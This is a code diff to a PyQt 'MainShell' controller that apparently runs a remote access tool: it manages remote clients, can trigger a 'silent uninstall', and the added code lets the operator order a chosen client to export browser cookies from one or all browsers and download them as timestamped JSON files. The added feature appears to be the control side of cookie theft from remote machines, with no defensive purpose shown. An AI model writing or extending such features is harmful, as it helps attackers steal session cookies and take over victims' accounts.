@@ -140,6 +140,7 @@ class MainShell(QtWidgets.QWidget):
 
         self.dashboard.storage_requested.connect(self.open_storage)
         self.dashboard.connect_requested.connect(self.toggle_connection)
+        self.dashboard.extra_action_requested.connect(self.handle_extra_action)
         self.dashboard.delete_requested.connect(self.handle_delete_request)
         self.dashboard.ping_updated.connect(self.update_ping)
         self.dashboard.server_status_changed.connect(self.handle_server_status)
@@ -271,6 +272,39 @@ class MainShell(QtWidgets.QWidget):
         client_name = client["name"] if client else client_id
         self.logger.log("log_delete_requested", client=client_name)
         self.send_silent_uninstall(client_id, client_name)
+
+    def handle_extra_action(self, client_id: str, action: str) -> None:
+        if not action:
+            return
+        if action.startswith("cookies:"):
+            browser = action.split(":", 1)[1] or "all"
+            browsers = [] if browser == "all" else [browser]
+            self.request_cookie_export(client_id, browsers)
+            return
+
+    def request_cookie_export(self, client_id: str, browsers: list[str]) -> None:
+        client = next((c for c in self.dashboard.clients if c["id"] == client_id), None)
+        client_name = client["name"] if client else client_id
+        label = ", ".join(browsers) if browsers else self.i18n.t("menu_cookies_all")
+        folder = QtWidgets.QFileDialog.getExistingDirectory(
+            self, self.i18n.t("storage_pick_folder"), ""
+        )
+        if not folder:
+            return
+        filename = self._build_cookie_filename(browsers)
+        if not self._open_session(client_id):
+            return
+        window = self._session_windows.get(client_id)
+        if not window:
+            return
+        window.request_cookie_export(browsers, filename=filename, download_dir=folder)
+        self.logger.log("log_cookies_request", client=client_name, browsers=label, path=folder)
+
+    @staticmethod
+    def _build_cookie_filename(browsers: list[str]) -> str:
+        stamp = QtCore.QDateTime.currentDateTime().toString("yyyyMMdd_HHmmss")
+        label = "all" if not browsers else "_".join(browsers)
+        return f"cookies_{label}_{stamp}.json"
 
     def send_silent_uninstall(self, client_id: str, client_name: str) -> None:
         # TODO: integrate with remote control backend to trigger uninstall.
